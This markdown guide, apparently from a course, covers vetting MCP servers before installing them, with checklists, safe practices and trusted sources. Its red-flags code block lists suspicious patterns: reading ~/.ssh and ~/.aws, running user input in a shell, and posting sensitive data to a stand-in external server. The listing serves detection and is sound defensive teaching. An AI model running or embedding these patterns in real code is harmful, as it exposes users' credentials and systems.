# MCP Security

> MCPs run on your machine. Choose them carefully.

---

## The Reality

MCPs are powerful because they can:
- Execute commands on your computer
- Read and write files
- Access your credentials (if poorly designed)
- Connect to external services

This power requires trust. Before installing an MCP, evaluate it.

---

## The MCP Security Evaluator

Use this framework (based on the [MCP Evaluator v3](https://github.com/JeredBlu/custom-instructions/blob/main/mcpevaluatorv3.md)) to assess any MCP:

### Quick Checklist

| Question | Red Flag |
|----------|----------|
| Who made it? | Unknown author, no GitHub history |
| Is the code open source? | Closed source, can't inspect |
| What permissions does it need? | Requests excessive access |
| How active is development? | Abandoned, no recent updates |
| Are there known issues? | Unresolved security bugs |
| What data does it access? | Credentials, personal files |

### The 5-Point Evaluation

**1. Source Trust**
- Is it from the official MCP repository?
- Is the author known/reputable?
- Can you read the source code?

**2. Permission Scope**
- Does it request minimal permissions?
- Does it access only what it needs?
- Are permissions well-documented?

**3. Data Handling**
- What data does it collect?
- Where is data stored?
- Is sensitive data encrypted?

**4. Code Quality**
- Is the code well-structured?
- Are there obvious security issues?
- Does it handle errors properly?

**5. Community Signals**
- GitHub stars and forks?
- Recent commits?
- Responsive maintainer?

---

## Safe Practices

### Before Installing

1. **Read the README** - Understand what it does
2. **Check the source** - Glance at the code
3. **Look for red flags** - Suspicious patterns, obfuscated code
4. **Test in isolation** - Try in a test project first

### After Installing

1. **Review permissions** - Check what it can access
2. **Monitor behavior** - Watch for unexpected activity
3. **Keep updated** - Security patches matter
4. **Remove unused** - Don't keep MCPs you don't use

---

## Red Flags to Watch For

**Code Patterns:**
```python
# Suspicious: Reading all environment variables
env_vars = os.environ.copy()

# Suspicious: Accessing sensitive paths
Path.home() / ".ssh"
Path.home() / ".aws"

# Suspicious: Executing arbitrary commands
os.system(user_input)
subprocess.run(user_input, shell=True)

# Suspicious: Sending data externally without disclosure
requests.post("http://unknown-server.com", data=sensitive_data)
```

**Documentation Gaps:**
- No clear explanation of what it does
- Missing permission justifications
- No privacy policy for data-handling MCPs

---

## Trusted Sources

**Official:**
- [MCP Reference Servers](https://github.com/modelcontextprotocol/servers)
- [MCP Registry](https://registry.modelcontextprotocol.io/)

**Community (verify before use):**
- GitHub repositories with good history
- MCPs recommended by known developers
- Projects with active communities

**This Course:**
- EA MCPs in this module are designed for learning
- Source code is provided and readable
- No external data transmission

---

## Environment Variables

MCPs that need API keys should:

1. **Use environment variables** - Not hardcoded credentials
2. **Document requirements** - Clear about what's needed
3. **Handle missing keys gracefully** - Clear error messages

Example `.env` setup:
```bash
# API Keys for MCPs (never commit this file!)
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-anon-key
```

---

## If Something Goes Wrong

1. **Stop Claude Code** - Close the terminal
2. **Disable the MCP** - Remove from .mcp.json or settings.json
3. **Check for damage** - Review recent file changes
4. **Report issues** - File a bug on the MCP's repository

---

## Quick Reference

| Risk Level | When to Use |
|------------|-------------|
| **Low** | Official MCPs, source available, minimal permissions |
| **Medium** | Community MCPs, reviewed code, specific permissions |
| **High** | Unknown source, closed code, broad permissions |
| **Never** | Obfuscated code, excessive permissions, no documentation |

---

*Trust but verify. Read the code. Limit permissions.*
